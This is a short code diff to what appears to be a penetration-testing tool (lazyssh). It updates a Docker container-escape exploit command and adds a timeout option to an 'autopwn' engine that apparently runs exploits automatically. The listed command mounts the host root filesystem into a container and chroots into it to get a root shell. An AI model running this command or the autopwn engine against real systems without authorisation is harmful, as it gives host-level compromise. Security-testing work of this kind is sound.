@@ -814,7 +814,7 @@ def _evaluate_docker_escape(
         evidence=evidence,
         exploitation_difficulty="easy",
         exploit_commands=[
-            "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
+            "docker run --rm -v /:/hostfs alpine chroot /hostfs /bin/bash",
         ],
     )
 
@@ -1689,7 +1689,16 @@ def main() -> int:  # pragma: no cover - CLI entry point
     if is_autopwn:
         from lazyssh.plugins._autopwn import AutopwnEngine
 
-        engine = AutopwnEngine(snapshot, findings, dry_run=is_dry_run)
+        timeout_val = 30
+        if "--timeout" in sys.argv:
+            idx = sys.argv.index("--timeout")
+            if idx + 1 < len(sys.argv):
+                try:
+                    timeout_val = max(5, min(120, int(sys.argv[idx + 1])))
+                except ValueError:
+                    pass
+
+        engine = AutopwnEngine(snapshot, findings, dry_run=is_dry_run, timeout=timeout_val)
         engine.run()
 
     return 0
